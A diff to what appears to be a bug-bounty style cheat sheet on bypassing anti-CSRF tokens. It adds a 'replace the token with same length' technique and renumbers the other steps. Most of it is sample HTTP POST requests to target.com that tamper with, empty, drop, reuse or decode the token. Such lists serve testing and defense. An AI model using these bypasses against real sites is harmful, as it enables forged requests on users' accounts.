@@ -13,7 +13,7 @@ POST /register HTTP/1.1
 Host: target.com
 [...]
 
-username=dapos&password=123456&token=aaaaaaaaaabaaaaaaaaaaa
+username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaab
 ```
 
 2. Sending empty value of token
@@ -33,7 +33,23 @@ Host: target.com
 username=dapos&password=123456&token=
 ```
 
-3. Changing POST / GET method
+3. Replace the token with same length
+```
+POST /register HTTP/1.1
+Host: target.com
+[...]
+
+username=dapos&password=123456&token=aaaaaa
+```
+Try this to bypass
+```
+POST /register HTTP/1.1
+Host: target.com
+[...]
+
+username=dapos&password=123456&token=aaabaa
+
+4. Changing POST / GET method
 ```
 POST /register HTTP/1.1
 Host: target.com
@@ -48,7 +64,7 @@ Host: target.com
 [...]
 ```
 
-4. Remove the token from request
+5. Remove the token from request
 ```
 POST /register HTTP/1.1
 Host: target.com
@@ -65,7 +81,7 @@ Host: target.com
 username=dapos&password=123456
 ```
 
-5. Use another user's valid token
+6. Use another user's valid token
 ```
 POST /register HTTP/1.1
 Host: target.com
@@ -74,7 +90,7 @@ Host: target.com
 username=dapos&password=123456&token=ANOTHER_VALID_TOKEN
 ```
 
-6. Try to decrypt hash
+7. Try to decrypt hash
 ```
 POST /register HTTP/1.1
 Host: target.com
@@ -84,7 +100,7 @@ username=dapos&password=123456&token=MTIzNDU2
 ```
 MTIzNDU2 => 123456 with base64
 
-7. Sometimes anti-CSRF token is composed by 2 parts, one of them remains static while the others one dynamic
+8. Sometimes anti-CSRF token is composed by 2 parts, one of them remains static while the others one dynamic
 ```
 POST /register HTTP/1.1
 Host: target.com
